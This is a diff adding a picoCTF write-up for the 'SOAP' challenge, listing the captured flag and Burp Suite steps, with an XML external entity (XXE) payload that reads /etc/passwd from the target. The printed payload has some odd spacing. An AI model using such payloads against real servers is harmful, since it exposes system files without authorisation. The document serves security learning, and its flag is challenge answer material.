@@ -1,5 +1,43 @@
 # SOAP
 
+**Flag:** `picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}`
+
+**Solution:**
+- The challenge gives a website whose `/etc/passwd` file is to be read with *XML external entity injection* (XXE).
+- I opened a browser in Burp Suite and put in the provided URL & clicked on one of the Details buttons.
+- This sent a POST request, which I sent to Repeater.
+- To perform XXE injection, I had to change the following script in the Request tab according to it.
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<data>
+  <ID>
+    2
+  </ID>
+</data>
+```
+XXE Payload:
+```
+< ?xml version="1.0" encoding="UTF-8"? >
+< !DOCTYPE foo [ 
+	<!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+	] >
+	<data><ID>
+		&xxe;
+	</ID></data>
+```
+
+- On hitting Send, the flag was visible in the last line of the Response section.
+![soap1.png](https://github.com/teayahz/cryptonite_taskphase_tia/blob/main/picoCTF/images/soap1.png?raw=true)
+
+**Concepts learnt:**
+1. XML External Entity Injection which is a vulnerability which exploits the processing of XML data, and the XML code for XXE injection payload
+2. The contents of the `/etc/passwd` file which is info on users 
+
+**Mistakes & other approaches:**
+- I had to turn Intercept Off & then On to receive the request from the site.
+
+**Resources:**
+- https://portswigger.net/web-security/xxe
 
 # Forbidden Paths
 
